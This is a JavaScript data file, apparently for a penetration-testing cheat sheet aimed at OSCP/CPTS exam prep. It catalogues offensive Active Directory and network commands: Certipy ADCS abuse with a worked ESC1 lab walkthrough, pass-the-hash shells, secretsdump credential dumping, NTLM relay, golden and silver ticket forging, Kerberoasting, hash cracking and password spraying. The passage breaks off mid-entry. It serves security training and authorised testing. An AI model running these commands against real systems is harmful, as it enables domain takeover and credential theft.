const OXREFS_DATA = {
  "metadata": {
    "category": {
      "oscp": {
        "label": "OSCP/CPTS",
        "description": "Part of the OSCP/CPTS exam-prep set."
      },
      "cli": {
        "label": "CLI",
        "description": "General daily-use CLI command."
      }
    },
    "have": {
      "hash": {
        "label": "Hash (NTLM)",
        "description": "NTLM / NT hash (pass-the-hash)."
      },
      "ticket": {
        "label": "Ticket (.ccache/.kirbi)",
        "description": "Kerberos ticket."
      },
      "cert": {
        "label": "Cert (.pfx/.pem)",
        "description": "Certificate."
      }
    },
    "os": {
      "Linux": {
        "label": "Linux",
        "description": "Command runs on Linux."
      },
      "Windows": {
        "label": "Windows",
        "description": "Command runs on Windows."
      }
    },
    "phase": {
      "Enumeration": {
        "label": "Enumeration",
        "description": "Information gathering."
      },
      "Exploitation": {
        "label": "Exploitation",
        "description": "Gaining access."
      },
      "PrivEsc": {
        "label": "PrivEsc",
        "description": "Privilege escalation."
      },
      "Persistence": {
        "label": "Persistence",
        "description": "Maintaining access."
      },
      "Cracking": {
        "label": "Cracking",
        "description": "Password / hash cracking."
      },
      "Pivoting": {
        "label": "Pivoting",
        "description": "Lateral movement / tunneling."
      },
      "LateralMovement": {
        "label": "LateralMovement",
        "description": "Moving between hosts / sessions."
      },
      "CredAccess": {
        "label": "CredAccess",
        "description": "Credential dumping and extraction."
      },
      "InitialAccess": {
        "label": "InitialAccess",
        "description": "Gaining first foothold."
      }
    },
    "service": {
      "SMB": {
        "label": "SMB",
        "description": "Server Message Block."
      },
      "LDAP": {
        "label": "LDAP",
        "description": "Directory access."
      },
      "Kerberos": {
        "label": "Kerberos",
        "description": "Kerberos authentication."
      },
      "WinRM": {
        "label": "WinRM",
        "description": "Windows Remote Management."
      },
      "RDP": {
        "label": "RDP",
        "description": "Remote Desktop."
      },
      "MSSQL": {
        "label": "MSSQL",
        "description": "Microsoft SQL Server."
      },
      "HTTP": {
        "label": "HTTP",
        "description": "Web service."
      },
      "SNMP": {
        "label": "SNMP",
        "description": "Simple Network Management Protocol."
      },
      "DNS": {
        "label": "DNS",
        "description": "Domain Name System."
      },
      "RPC": {
        "label": "RPC",
        "description": "Remote Procedure Call."
      },
      "Redis": {
        "label": "Redis",
        "description": "Redis key-value store."
      },
      "MySQL": {
        "label": "MySQL",
        "description": "MySQL database."
      },
      "SSH": {
        "label": "SSH",
        "description": "Secure Shell."
      },
      "AD": {
        "label": "AD",
        "description": "Active Directory (general)."
      },
      "ADCS": {
        "label": "ADCS",
        "description": "Active Directory Certificate Services."
      },
      "WMI": {
        "label": "WMI",
        "description": "Windows Management Instrumentation."
      },
      "FTP": {
        "label": "FTP",
        "description": "File Transfer Protocol."
      }
    }
  },
  "commands": [
    {
      "variants": [
        {
          "label": "ldap",
          "command": "auth_ldap $IP $USER -p $PASSWORD $DOMAIN [-ldap|-ldaps]\n"
        },
        {
          "label": "kerberos",
          "command": "auth_kerberos -u $USER -p $PASSWORD -i $DCIP -d $DOMAIN\n"
        },
        {
          "label": "smb",
          "command": "auth_smb -t $IP -u $USER -p $PASSWORD -d $DOMAIN\n"
        }
      ],
      "description": "Authenticated enumeration helpers (OffensiveSecurityScripts), by protocol.",
      "os": [
        "Linux"
      ],
      "category": [
        "oscp",
        "cli"
      ],
      "service": [
        "LDAP",
        "Kerberos",
        "SMB"
      ],
      "phase": [
        "Enumeration"
      ],
      "references": [
        "https://github.com/strikoder/OffensiveSecurityScripts"
      ],
      "name": "auth-enum"
    },
    {
      "command": "uv run bloodhound.py -u $USER -p $PASSWORD -d $DOMAIN -v --zip -c All -dc $DOMAIN -ns $IP\n",
      "description": "Remotely collect BloodHound data using credentials.",
      "os": [
        "Linux"
      ],
      "category": [
        "oscp",
        "cli"
      ],
      "service": [
        "LDAP"
      ],
      "phase": [
        "Enumeration"
      ],
      "references": [
        "https://github.com/fox-it/BloodHound.py"
      ],
      "name": "bloodhound-py"
    },
    {
      "command": "bloodyAD --host $IP -d $DOMAIN -u $USER -p $PASSWORD get writable --detail\n",
      "description": "List AD objects and properties the current user can write to.",
      "os": [
        "Linux"
      ],
      "category": [
        "oscp",
        "cli"
      ],
      "service": [
        "LDAP"
      ],
      "phase": [
        "Enumeration"
      ],
      "references": [
        "https://github.com/CravateRouge/bloodyAD"
      ],
      "name": "bloodyad"
    },
    {
      "variants": [
        {
          "label": "cas",
          "command": "Certify.exe cas\n"
        },
        {
          "label": "vulnerable",
          "command": "Certify.exe find /vulnerable\n"
        }
      ],
      "description": "Enumerate certificate authorities and vulnerable ADCS templates.",
      "os": [
        "Windows"
      ],
      "category": [
        "oscp"
      ],
      "service": [
        "ADCS"
      ],
      "phase": [
        "Enumeration"
      ],
      "references": [
        "https://github.com/GhostPack/Certify"
      ],
      "name": "certify"
    },
    {
      "variants": [
        {
          "label": "find",
          "command": "certipy find -dc-ip $DCIP -u $USER@$DOMAIN -p $PASSWORD -vulnerable -stdout\ncertipy find -k -target $DC -vulnerable -stdout\n"
        },
        {
          "label": "esc1",
          "command": "# 1. find vulnerable templates\ncertipy find -dc-ip $DCIP -u $USER -p $PASSWORD -vulnerable -stdout\n# -> found ESC1 on the RetroClients template; note the template name\n# 2. request a cert impersonating administrator\ncertipy req -dc-ip $DCIP -u $USER@$DOMAIN -p $PASSWORD -target 'dc.sequel.htb' -ca 'sequel-DC-CA' -template [UserAuthentication] -upn 'administrator@sequel.htb' -key-size 4096\n# -> got a cert but auth failed (likely wrong SID)\n# 3. find the real Administrator SID\nimpacket-lookupsid retro.vl/BANKING$:test123@dc.retro.vl\n# -> S-1-5-21-2983547755-698260136-4283918172-500\n# 4. re-request with the correct -sid\ncertipy req -u 'BANKING$@retro.vl' -p test123 -ca retro-DC-CA -template RetroClients -upn administrator@retro.vl -sid S-1-5-21-2983547755-698260136-4283918172-500 -key-size 4096\n# 5. auth with the pfx (on errors try ntpdate -s, or add -ldap-shell to add the user to domain admins)\ncertipy auth -pfx administrator.pfx -dc-ip 10.129.234.44\n# -> NT hash: 252fac7066d93dd009d4fd2cd0368389\n# 6. pass-the-hash for a shell\nimpacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:252fac7066d93dd009d4fd2cd0368389 administrator@DC.retro.vl\n"
        },
        {
          "label": "esc7",
          "command": "# add yourself as a CA officer to issue certs manually\ncertipy ca -dc-ip $DCIP -u $USER -p $PASSWORD -ca $CA -add-officer $USER\n# enable the SubCA template\ncertipy ca -dc-ip $DCIP -u $USER -p $PASSWORD -ca $CA -enable-template subca\n# check the enabled templates\ncertipy ca -dc-ip $DCIP -u $USER -p $PASSWORD -ca $CA -list-templates\n# request fails but returns a key; note the Request ID (press y to save .pfx)\ncertipy req -u $USER -p $PASSWORD -ca $CA -target $DCIP -template SubCA -upn administrator@$DOMAIN\n# issue the pending request as an officer\ncertipy ca -u $USER -p $PASSWORD -ca $CA -target $DCIP -issue-request $REQUESTID\n# retrieve the issued cert\ncertipy req -u $USER -p $PASSWORD -ca $CA -target $DCIP -retrieve $REQUESTID\n# auth with the pfx\ncertipy auth -pfx administrator.pfx -dc-ip $DCIP -domain $DOMAIN\n"
        },
        {
          "label": "esc9",
          "command": "# change the target account's UPN to Administrator\ncertipy account update -dc-ip $DCIP -u $USER -hashes $HASH -user $TARGET_USER -upn Administrator\n# request a cert as the target (UPN now = Administrator)\ncertipy req -dc-ip $DCIP -u $TARGET_USER@$DOMAIN -hashes $TARGET_HASH -target $DC -ca $CA -template $TEMPLATE -upn administrator@$DOMAIN\n# set the UPN back so it doesn't conflict with the real Administrator\ncertipy account update -dc-ip $DCIP -u $USER -hashes $HASH -user $TARGET_USER -upn $TARGET_USER@$DOMAIN\n# auth using the pfx\ncertipy auth -dc-ip $DCIP -pfx administrator.pfx -domain $DOMAIN\n"
        },
        {
          "label": "shadow",
          "command": "# shadow credentials: add a KeyCredentialLink on the target and recover its hash\ncertipy shadow auto -dc-ip $DCIP -u $USER -hashes $HASH -account $TARGET_USER\n"
        },
        {
          "label": "auth",
          "command": "# authenticate with a pfx to recover the NT hash / get a TGT\ncertipy auth -dc-ip $DCIP -pfx administrator.pfx\n# if that fails, drop into an LDAP shell instead\ncertipy auth -dc-ip $DCIP -pfx administrator.pfx -ldap-shell\n"
        }
      ],
      "description": "Enumerate and abuse AD CS with Certipy (ESC1 / ESC7 / ESC9 / shadow).",
      "os": [
        "Linux"
      ],
      "category": [
        "oscp",
        "cli"
      ],
      "have": [
        "hash",
        "ticket",
        "cert"
      ],
      "service": [
        "ADCS",
        "Kerberos"
      ],
      "phase": [
        "Enumeration",
        "PrivEsc"
      ],
      "references": [
        "https://github.com/ly4k/Certipy"
      ],
      "name": "certipy"
    },
    {
      "variants": [
        {
          "label": "check-protections",
          "command": "checksec --file=$FILE\n"
        }
      ],
      "description": "Verify binary security protections (NX, PIE, Canary, ASLR, RELRO).",
      "os": [
        "Linux"
      ],
      "category": [
        "cli"
      ],
      "phase": [
        "Enumeration"
      ],
      "references": [
        "https://github.com/zernanvash/cheatsheet/blob/main/tools/Reversing%20CLI%20Tools%20Cheat%20Sheet.md"
      ],
      "name": "checksec"
    },
    {
      "command": "credspray.sh -t $IP -u findings.txt -c findings.txt\n",
      "description": "Spray discovered credentials across a target.",
      "os": [
        "Linux"
      ],
      "category": [
        "oscp",
        "cli"
      ],
      "phase": [
        "InitialAccess"
      ],
      "references": [
        "https://github.com/strikoder/CredSpray"
      ],
      "name": "credspray"
    },
    {
      "command": "uv run dementor.py -u $USER -p $PASSWORD -d $DOMAIN $LHOST $IP\n",
      "description": "Coerce printer spooler authentication from target to attacker (for relay).",
      "os": [
        "Linux"
      ],
      "category": [
        "oscp",
        "cli"
      ],
      "service": [
        "RPC"
      ],
      "phase": [
        "Exploitation"
      ],
      "references": [
        "https://gist.github.com/3xocyte/cfaf8a34f76569a8251bde65fe69dccc"
      ],
      "name": "dementor"
    },
    {
      "variants": [
        {
          "label": "standard",
          "command": "dig $DOMAIN A\n"
        },
        {
          "label": "reverse",
          "command": "dig -x $IP\n"
        },
        {
          "label": "axfr",
          "command": "dig axfr $DOMAIN @$IP\n"
        },
        {
          "label": "trace",
          "command": "dig $DOMAIN +trace\n"
        }
      ],
      "description": "DNS lookup, reverse lookup, trace recursion path, or request zone transfer using dig.",
      "os": [
        "Linux"
      ],
      "category": [
        "oscp",
        "cli"
      ],
      "service": [
        "DNS"
      ],
      "phase": [
        "Enumeration"
      ],
      "references": [
        "https://github.com/zernanvash/cheatsheet/blob/main/tools/Dig%20Cheat%20Sheet.md"
      ],
      "name": "dig"
    },
    {
      "variants": [
        {
          "label": "scan",
          "command": "nmap --script smb-vuln-ms17-010 -p445 $IP\n"
        }
      ],
      "description": "Scan for MS17-010 (EternalBlue) vulnerability in SMBv1.",
      "os": [
        "Linux"
      ],
      "category": [
        "oscp"
      ],
      "service": [
        "SMB"
      ],
      "phase": [
        "Enumeration"
      ],
      "references": [
        "https://github.com/zernanvash/cheatsheet/blob/main/tools/EternalBlue%20Cheat%20Sheet.md"
      ],
      "name": "eternalblue"
    },
    {
      "variants": [
        {
          "label": "creds",
          "command": "evil-winrm -i $IP -u $USER -p $PASSWORD\n"
        },
        {
          "label": "hash",
          "command": "evil-winrm -i $IP -u $USER -H $HASH\n"
        },
        {
          "label": "ticket",
          "command": "evil-winrm -i $IP -u $USER -k\n"
        },
        {
          "label": "cert",
          "command": "evil-winrm -i $IP -c pub.pem -k priv.pem -S -r $DOMAIN\n"
        }
      ],
      "description": "Interactive WinRM shell, by auth method.",
      "os": [
        "Linux"
      ],
      "category": [
        "oscp",
        "cli"
      ],
      "have": [
        "hash",
        "ticket",
        "cert"
      ],
      "service": [
        "WinRM"
      ],
      "phase": [
        "Exploitation"
      ],
      "references": [
        "https://github.com/Hackplayers/evil-winrm"
      ],
      "name": "evil-winrm"
    },
    {
      "command": "ffuf -u http://$IP/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -t 300 -fs 3142\n",
      "description": "Directory fuzz a web server filtering by response size.",
      "os": [
        "Linux"
      ],
      "category": [
        "oscp",
        "cli"
      ],
      "service": [
        "HTTP"
      ],
      "phase": [
        "Enumeration"
      ],
      "references": [
        "https://github.com/ffuf/ffuf"
      ],
      "name": "ffuf"
    },
    {
      "command": "uv run FindUncommonShares.py --dc-ip $IP -u '$USER' -d '$DOMAIN' -p '$PASSWORD'\n",
      "description": "Find uncommon SMB shares across the domain (PowerView-equivalent).",
      "os": [
        "Linux"
      ],
      "category": [
        "oscp",
        "cli"
      ],
      "service": [
        "SMB"
      ],
      "phase": [
        "Enumeration"
      ],
      "references": [
        "https://github.com/p0dalirius/FindUncommonShares"
      ],
      "name": "finduncommonshares"
    },
    {
      "variants": [
        {
          "label": "mirror",
          "command": "wget -m ftp://anonymous:anonymous@$IP/\n"
        },
        {
          "label": "login",
          "command": "ftp $IP\n"
        },
        {
          "label": "crack",
          "command": "hydra -l $USER -P /usr/share/wordlists/rockyou.txt ftp://$IP\n"
        }
      ],
      "description": "Mirror anonymous FTP, connect interactively, or password spray.",
      "os": [
        "Linux"
      ],
      "category": [
        "oscp",
        "cli"
      ],
      "service": [
        "FTP"
      ],
      "phase": [
        "Enumeration"
      ],
      "references": [
        "https://github.com/zernanvash/cheatsheet/blob/main/tools/FTP%20Cheat%20Sheet.md"
      ],
      "name": "ftp"
    },
    {
      "command": "uv run gettgtpkinit.py $DOMAIN/$DC -cert-pfx crt.pfx -pfx-pass $PASSWORD out.ccache\n",
      "description": "Request a TGT using a PFX certificate via PKINIT.",
      "os": [
        "Linux"
      ],
      "category": [
        "oscp",
        "cli"
      ],
      "have": [
        "cert"
      ],
      "service": [
        "Kerberos"
      ],
      "phase": [
        "Exploitation"
      ],
      "references": [
        "https://github.com/dirkjanm/PKINITtools"
      ],
      "name": "gettgtpkinit"
    },
    {
      "command": "uv run gtfobinsuid.py\n",
      "description": "Find and exploit SUID binaries via GTFOBins for privilege escalation.",
      "os": [
        "Linux"
      ],
      "category": [
        "oscp",
        "cli"
      ],
      "phase": [
        "PrivEsc"
      ],
      "references": [
        "https://github.com/strikoder/gtfobinSUID"
      ],
      "name": "gtfobinsuid"
    },
    {
      "variants": [
        {
          "label": "NTLM",
          "command": "hashcat -m 1000 hashes.ntlm2 /usr/share/wordlists/rockyou.txt --username\n"
        },
        {
          "label": "NTLMv2",
          "command": "hashcat -m 5600 hashes.ntlm2 /usr/share/wordlists/rockyou.txt\n"
        },
        {
          "label": "Kerberoast",
          "command": "hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best66.rule\n"
        },
        {
          "label": "ASREP",
          "command": "hashcat -m 18200 hashes.asrep /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best66.rule\n"
        },
        {
          "label": "MD5",
          "command": "hashcat -m 0 hashes.md5 /usr/share/wordlists/rockyou.txt\n"
        },
        {
          "label": "SHA1",
          "command": "hashcat -m 100 hashes.sha1 /usr/share/wordlists/rockyou.txt -O\n"
        },
        {
          "label": "KeePass",
          "command": "hashcat -m 13400 database.kdbx /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/rockyou-30000.rule\n"
        },
        {
          "label": "PSK",
          "command": "hashcat -m 5400 presharedkey.psk /usr/share/wordlists/rockyou.txt\n"
        },
        {
          "label": "htpasswd",
          "command": "hashcat -m 1600 hashes.htpasswd /usr/share/wordlists/rockyou.txt -O\n"
        }
      ],
      "description": "Crack hashes with hashcat, picking the mode by hash type.",
      "os": [
        "Linux"
      ],
      "category": [
        "oscp",
        "cli"
      ],
      "phase": [
        "Cracking"
      ],
      "references": [
        "https://hashcat.net/wiki/doku.php?id=example_hashes"
      ],
      "name": "hashcat"
    },
    {
      "variants": [
        {
          "label": "ldaps",
          "command": "impacket-addcomputer -dc-ip $IP -method LDAPS -computer-pass $NEWPASSWORD -computer-name EVILPC $DOMAIN/$USER:$PASSWORD\n"
        },
        {
          "label": "smb",
          "command": "impacket-addcomputer -dc-ip $IP -method SAMR -computer-pass $NEWPASSWORD -computer-name EVILPC $DOMAIN/$USER:$PASSWORD\n"
        }
      ],
      "description": "Add a computer account to the domain, by method.",
      "os": [
        "Linux"
      ],
      "category": [
        "oscp",
        "cli"
      ],
      "service": [
        "LDAP",
        "SMB"
      ],
      "phase": [
        "Exploitation"
      ],
      "references": [
        "https://github.com/fortra/impacket"
      ],
      "name": "impacket-addcomputer"
    },
    {
      "variants": [
        {
          "label": "creds",
          "command": "impacket-atexec $DOMAIN/$USER:$PASSWORD@$IP whoami\n"
        },
        {
          "label": "hash",
          "command": "impacket-atexec -hashes :$HASH $DOMAIN/$USER@$IP whoami\n"
        }
      ],
      "description": "Run a command via Task Scheduler with impacket, by auth method.",
      "os": [
        "Linux"
      ],
      "category": [
        "oscp",
        "cli"
      ],
      "have": [
        "hash"
      ],
      "service": [
        "SMB"
      ],
      "phase": [
        "Exploitation"
      ],
      "references": [
        "https://github.com/fortra/impacket"
      ],
      "name": "impacket-atexec"
    },
    {
      "variants": [
        {
          "label": "kpasswd",
          "command": "impacket-changepasswd -protocol kpasswd '$DOMAIN/$USER:$PASSWORD'@$DCIP -newpass $NEWPASSWORD\n"
        },
        {
          "label": "smb",
          "command": "impacket-changepasswd -protocol smb '$DOMAIN/$USER:$PASSWORD'@$DCIP -newpass $NEWPASSWORD\n"
        },
        {
          "label": "rpc",
          "command": "net rpc password '$USER' '$NEWPASSWORD' -U '$DOMAIN/$USER%$PASSWORD' -S $DCIP\n"
        }
      ],
      "description": "Change an AD user's password, by protocol.",
      "os": [
        "Linux"
      ],
      "category": [
        "oscp",
        "cli"
      ],
      "service": [
        "Kerberos",
        "SMB"
      ],
      "phase": [
        "Exploitation"
      ],
      "references": [
        "https://github.com/fortra/impacket"
      ],
      "name": "impacket-changepasswd"
    },
    {
      "command": "impacket-dcomexec -object MMC20 $DOMAIN/$USER:$PASSWORD@$IP\n",
      "description": "Interactive shell via DCOM (MMC20.Application endpoint).",
      "os": [
        "Linux"
      ],
      "category": [
        "oscp",
        "cli"
      ],
      "service": [
        "RPC"
      ],
      "phase": [
        "Exploitation"
      ],
      "references": [
        "https://github.com/fortra/impacket"
      ],
      "name": "impacket-dcomexec"
    },
    {
      "command": "impacket-Get-GPPPassword -dc-ip $IP '$DOMAIN/$USER:$PASSWORD@$DC.$DOMAIN'\n",
      "description": "Extract and decrypt Group Policy Preferences (GPP) passwords.",
      "os": [
        "Linux"
      ],
      "category": [
        "oscp",
        "cli"
      ],
      "service": [
        "SMB"
      ],
      "phase": [
        "Enumeration"
      ],
      "references": [
        "https://github.com/fortra/impacket"
      ],
      "name": "impacket-Get-GPPPassword"
    },
    {
      "command": "impacket-GetADUsers -dc-ip $IP -all $DOMAIN/$USER:$PASSWORD\n",
      "description": "Enumerate domain users and their email addresses via Kerberos.",
      "os": [
        "Linux"
      ],
      "category": [
        "oscp",
        "cli"
      ],
      "service": [
        "Kerberos"
      ],
      "phase": [
        "Enumeration"
      ],
      "references": [
        "https://github.com/fortra/impacket"
      ],
      "name": "impacket-GetADUsers"
    },
    {
      "command": "impacket-GetNPUsers -dc-ip $IP $DOMAIN/ -usersfile usernames.txt -format hashcat -outputfile hashes.asrep\n",
      "description": "AS-REP roast accounts with pre-auth disabled (no creds needed).",
      "os": [
        "Linux"
      ],
      "category": [
        "oscp",
        "cli"
      ],
      "service": [
        "Kerberos"
      ],
      "phase": [
        "Exploitation"
      ],
      "references": [
        "https://github.com/fortra/impacket"
      ],
      "name": "impacket-GetNPUsers"
    },
    {
      "command": "impacket-getPac -targetUser $TARGET_USER $DOMAIN/$USER:$PASSWORD\n",
      "description": "Retrieve the PAC of a target user (useful for privilege analysis).",
      "os": [
        "Linux"
      ],
      "category": [
        "oscp",
        "cli"
      ],
      "service": [
        "Kerberos"
      ],
      "phase": [
        "Enumeration"
      ],
      "references": [
        "https://github.com/fortra/impacket"
      ],
      "name": "impacket-getPac"
    },
    {
      "variants": [
        {
          "label": "creds",
          "command": "impacket-getST -dc-ip $IP -spn $SPN -impersonate administrator $DOMAIN/$USER:$PASSWORD\n"
        },
        {
          "label": "hash",
          "command": "impacket-getST -dc-ip $IP -spn $SPN -impersonate administrator $DOMAIN/$USER -hashes :$HASH\n"
        },
        {
          "label": "ticket",
          "command": "# mint a service ticket from an existing TGT ccache (you already hold a TGT)\ngetST.py --ccache tgt.ccache --kirbi cifs.kirbi -spn cifs/$DC\n# fallback via the minikerberos copy if the above misbehaves\npython3 /usr/lib/python3/dist-packages/minikerberos/examples/getST.py --ccache tgt.ccache --kirbi cifs.kirbi -spn cifs/$DC\n"
        }
      ],
      "description": "Request a service ticket impersonating administrator (delegation) or from a ccache, by auth method.",
      "os": [
        "Linux"
      ],
      "category": [
        "oscp",
        "cli"
      ],
      "have": [
        "hash",
        "ticket"
      ],
      "service": [
        "Kerberos"
      ],
      "phase": [
        "PrivEsc"
      ],
      "references": [
        "https://github.com/fortra/impacket"
      ],
      "name": "impacket-getST"
    },
    {
      "variants": [
        {
          "label": "creds",
          "command": "impacket-getTGT -dc-ip $DCIP $DOMAIN/$USER:$PASSWORD\n"
        },
        {
          "label": "hash",
          "command": "impacket-getTGT -dc-ip $DCIP $DOMAIN/$USER -hashes :$HASH\n"
        }
      ],
      "description": "Request a Kerberos TGT with impacket, by auth method.",
      "os": [
        "Linux"
      ],
      "category": [
        "oscp",
        "cli"
      ],
      "have": [
        "hash"
      ],
      "service": [
        "Kerberos"
      ],
      "phase": [
        "Exploitation"
      ],
      "references": [
        "https://github.com/fortra/impacket"
      ],
      "name": "impacket-getTGT"
    },
    {
      "command": "impacket-GetUserSPNs -dc-ip $IP $DOMAIN/$USER:$PASSWORD\n",
      "description": "Request Kerberoastable TGS tickets for offline cracking.",
      "os": [
        "Linux"
      ],
      "category": [
        "oscp",
        "cli"
      ],
      "service": [
        "Kerberos"
      ],
      "phase": [
        "PrivEsc"
      ],
      "references": [
        "https://github.com/fortra/impacket"
      ],
      "name": "impacket-GetUserSPNs"
    },
    {
      "command": "impacket-lookupsid $DOMAIN/$USER:$PASSWORD@$IP\n",
      "description": "Brute-force domain SIDs to enumerate users and groups (SID walker).",
      "os": [
        "Linux"
      ],
      "category": [
        "oscp",
        "cli"
      ],
      "service": [
        "RPC"
      ],
      "phase": [
        "Enumeration"
      ],
      "references": [
        "https://github.com/fortra/impacket"
      ],
      "name": "impacket-lookupsid"
    },
    {
      "command": "impacket-mssqlclient $USER:$PASSWORD@$IP -windows-auth\n",
      "description": "Connect to an MSSQL server using Windows authentication.",
      "os": [
        "Linux"
      ],
      "category": [
        "oscp",
        "cli"
      ],
      "service": [
        "MSSQL"
      ],
      "phase": [
        "Exploitation"
      ],
      "references": [
        "https://github.com/fortra/impacket"
      ],
      "name": "impacket-mssqlclient"
    },
    {
      "variants": [
        {
          "label": "exec",
          "command": "impacket-ntlmrelayx -smb2support -t smb://$IP -c 'whoami /all' -debug\n"
        },
        {
          "label": "socks",
          "command": "impacket-ntlmrelayx -smb2support -t smb://$IP -socks\n"
        },
        {
          "label": "wpad",
          "command": "impacket-ntlmrelayx -t ldaps://$DC.$DOMAIN -wh wpad --delegate-access\n"
        }
      ],
      "description": "Relay captured NTLM authentication, by mode.",
      "os": [
        "Linux"
      ],
      "category": [
        "oscp",
        "cli"
      ],
      "service": [
        "SMB",
        "LDAP"
      ],
      "phase": [
        "Exploitation"
      ],
      "references": [
        "https://github.com/fortra/impacket"
      ],
      "name": "impacket-ntlmrelayx"
    },
    {
      "variants": [
        {
          "label": "creds",
          "command": "impacket-psexec $DOMAIN/$USER:$PASSWORD@$IP\n"
        },
        {
          "label": "hash",
          "command": "impacket-psexec -hashes :$HASH $DOMAIN/$USER@$IP\n"
        },
        {
          "label": "ticket",
          "command": "impacket-psexec -k -no-pass $DOMAIN/$USER@$IP\n"
        },
        {
          "label": "spray",
          "command": "paste users.txt hashes.txt | while IFS=$'\\t' read -r user hash; do\n  impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:$hash $DOMAIN/\"$user\"@$IP\ndone\n"
        }
      ],
      "description": "Get a SYSTEM shell via PSExec, by auth method.",
      "os": [
        "Linux"
      ],
      "category": [
        "oscp",
        "cli"
      ],
      "have": [
        "hash",
        "ticket"
      ],
      "service": [
        "SMB"
      ],
      "phase": [
        "Exploitation"
      ],
      "references": [
        "https://github.com/fortra/impacket"
      ],
      "name": "impacket-psexec"
    },
    {
      "command": "impacket-rbcd -dc-ip $IP -action write -delegate-to \"$DC$\" -delegate-from \"EVILPC$\" -hashes :$HASH $DOMAIN/$USER\n",
      "description": "Write RBCD (Resource-Based Constrained Delegation) attribute to a machine account.",
      "os": [
        "Linux"
      ],
      "category": [
        "oscp",
        "cli"
      ],
      "have": [
        "hash"
      ],
      "service": [
        "LDAP"
      ],
      "phase": [
        "PrivEsc"
      ],
      "references": [
        "https://github.com/fortra/impacket"
      ],
      "name": "impacket-rbcd"
    },
    {
      "command": "impacket-rpcdump $DOMAIN/$USER:$PASSWORD@$IP\n",
      "description": "Dump RPC endpoints from a remote Windows host.",
      "os": [
        "Linux"
      ],
      "category": [
        "oscp",
        "cli"
      ],
      "service": [
        "RPC"
      ],
      "phase": [
        "Enumeration"
      ],
      "references": [
        "https://github.com/fortra/impacket"
      ],
      "name": "impacket-rpcdump"
    },
    {
      "command": "impacket-samrdump $DOMAIN/$USER:$PASSWORD@$IP\n",
      "description": "Enumerate users, groups, and shares via SAMR protocol.",
      "os": [
        "Linux"
      ],
      "category": [
        "oscp",
        "cli"
      ],
      "service": [
        "RPC"
      ],
      "phase": [
        "Enumeration"
      ],
      "references": [
        "https://github.com/fortra/impacket"
      ],
      "name": "impacket-samrdump"
    },
    {
      "variants": [
        {
          "label": "creds",
          "command": "impacket-secretsdump $DOMAIN/$USER:$PASSWORD@$IP\n"
        },
        {
          "label": "hash",
          "command": "impacket-secretsdump $DOMAIN/$USER@$IP -hashes :$HASH\n"
        },
        {
          "label": "ntds",
          "command": "impacket-secretsdump -dc-ip $IP -ntds C:\\Windows\\NTDS\\ntds.dit -system C:\\Windows\\System32\\Config\\system $DOMAIN/$USER:$PASSWORD@$IP\n"
        },
        {
          "label": "vss",
          "command": "impacket-secretsdump $DOMAIN/$USER@$IP -hashes :$HASH -use-vss\n"
        }
      ],
      "description": "Dump SAM, LSA, and domain secrets with impacket, by source/auth.",
      "os": [
        "Linux"
      ],
      "category": [
        "oscp",
        "cli"
      ],
      "have": [
        "hash"
      ],
      "service": [
        "SMB"
      ],
      "phase": [
        "PrivEsc"
      ],
      "references": [
        "https://github.com/fortra/impacket"
      ],
      "name": "impacket-secretsdump"
    },
    {
      "command": "impacket-services $DOMAIN/$USER:$PASSWORD@$IP list\n",
      "description": "List Windows services on a remote host via impacket.",
      "os": [
        "Linux"
      ],
      "category": [
        "oscp",
        "cli"
      ],
      "service": [
        "SMB"
      ],
      "phase": [
        "Enumeration"
      ],
      "references": [
        "https://github.com/fortra/impacket"
      ],
      "name": "impacket-services"
    },
    {
      "variants": [
        {
          "label": "hash",
          "command": "impacket-smbexec -hashes :$HASH $DOMAIN/$USER@$IP\n"
        },
        {
          "label": "ticket",
          "command": "impacket-smbexec -k -no-pass $DOMAIN/$USER@$IP\n"
        }
      ],
      "description": "Get a shell via SMBExec, by auth method.",
      "os": [
        "Linux"
      ],
      "category": [
        "oscp",
        "cli"
      ],
      "have": [
        "hash",
        "ticket"
      ],
      "service": [
        "SMB"
      ],
      "phase": [
        "Exploitation"
      ],
      "references": [
        "https://github.com/fortra/impacket"
      ],
      "name": "impacket-smbexec"
    },
    {
      "command": "impacket-ticketConverter ticket.kirbi ticket.ccache\nexport KRB5CCNAME=ticket.ccache\n",
      "description": "Convert a Kerberos ticket between .kirbi and .ccache, then load it for pass-the-ticket.",
      "os": [
        "Linux"
      ],
      "category": [
        "oscp",
        "cli"
      ],
      "have": [
        "ticket"
      ],
      "service": [
        "Kerberos"
      ],
      "phase": [
        "LateralMovement"
      ],
      "references": [
        "https://github.com/fortra/impacket"
      ],
      "name": "impacket-ticketconverter"
    },
    {
      "variants": [
        {
          "label": "golden",
          "command": "impacket-ticketer -dc-ip $DCIP -nthash $HASH -domain-sid $SID -domain $DOMAIN -user-id $UID -groups '$GROUPS' $USER\n"
        },
        {
          "label": "silver",
          "command": "impacket-ticketer -dc-ip $DCIP -nthash $HASH -domain-sid $SID -domain $DOMAIN -spn $SPN $USER\n"
        }
      ],
      "description": "Forge a Kerberos ticket with impacket, by ticket type.",
      "os": [
        "Linux"
      ],
      "category": [
        "oscp",
        "cli"
      ],
      "have": [
        "hash"
      ],
      "service": [
        "Kerberos"
      ],
      "phase": [
        "Persistence"
      ],
      "references": [
        "https://github.com/fortra/impacket"
      ],
      "name": "impacket-ticketer"
    },
    {
      "variants": [
        {
          "label": "creds",
          "command": "impacket-wmiexec $DOMAIN/$USER:$PASSWORD@$IP\n"
        },
        {
          "label": "hash",
          "command": "impacket-wmiexec -hashes :$HASH $DOMAIN/$USER@$IP\n"
        },
        {
          "label": "ticket",
          "command": "impacket-wmiexec -k -no-pass $DOMAIN/$USER@$IP\n"
        }
      ],
      "description": "Semi-interactive shell on a remote host via WMI, by auth method.",
      "os": [
        "Linux"
      ],
      "category": [
        "oscp",
        "cli"
      ],
      "have": [
        "hash",
        "ticket"
      ],
      "service": [
        "SMB"
      ],
      "phase": [
        "Exploitation"
      ],
      "references": [
        "https://github.com/fortra/impacket"
      ],
      "name": "impacket-wmiexec"
    },
    {
      "variants": [
        {
          "label": "bcrypt",
          "command": "john --wordlist=/usr/share/wordlists/rockyou.txt hashes.bcrypt\n"
        },
        {
          "label": "md5",
